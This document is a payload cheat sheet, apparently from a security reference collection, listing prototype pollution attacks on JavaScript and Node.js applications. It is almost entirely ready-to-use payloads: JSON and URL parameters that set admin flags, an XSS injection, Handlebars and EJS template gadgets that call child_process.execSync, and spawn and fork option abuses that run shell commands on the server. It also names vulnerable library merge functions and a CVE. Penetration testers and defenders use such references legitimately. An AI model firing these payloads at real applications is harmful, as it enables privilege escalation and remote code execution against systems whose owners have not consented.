---
id: "prototype-pollution-payloads"
title: "Prototype Pollution Payloads"
type: "payload"
category: "web-application"
subcategory: "javascript"
tags: ["prototype-pollution", "__proto__", "constructor", "javascript", "xss", "rce"]
platforms: ["linux", "macos", "windows"]
related: ["prototype-pollution", "xss-advanced-techniques"]
difficulty: "advanced"
updated: "2026-04-14"
---

# Prototype Pollution Payloads

## JSON Body Payloads
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"role": "admin"}}
{"__proto__": {"toString": "pwned"}}
```

## URL Parameter Payloads
```
?__proto__[isAdmin]=true
?__proto__.isAdmin=true
?constructor[prototype][isAdmin]=true
?__proto__[role]=admin
```

## XSS via Prototype Pollution
```json
// If app uses innerHTML or jQuery.html() with polluted prototype:
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

// Handlebars/Pug/EJS gadgets:
{"__proto__": {"type": "Program", "body": [{"type":"MustacheStatement","path":{"type":"PathExpression","original":"constructor"},"params":[{"type":"SubExpression","path":{"type":"PathExpression","original":"constructor"},"params":[{"type":"StringLiteral","value":"return process.mainModule.require('child_process').execSync('id')"}]}]}]}}
```

## Node.js RCE via Prototype Pollution
```json
// Pollution + child_process.spawn:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}

// Pollution + child_process.fork:
{"__proto__": {"execPath": "/bin/sh", "execArgv": ["-c", "id > /tmp/pwned"]}}

// EJS template engine:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
```

## Common Gadgets
```
// Lodash merge/defaultsDeep (CVE-2019-10744):
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'))

// jQuery extend:
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":true}}'))

// Express qs parser:
// ?__proto__[polluted]=true → parsed into nested object
```

## Detection
```javascript
// Check if pollution works:
// Before: ({}).polluted === undefined
// After:  ({}).polluted === true
// If true → pollution successful
```
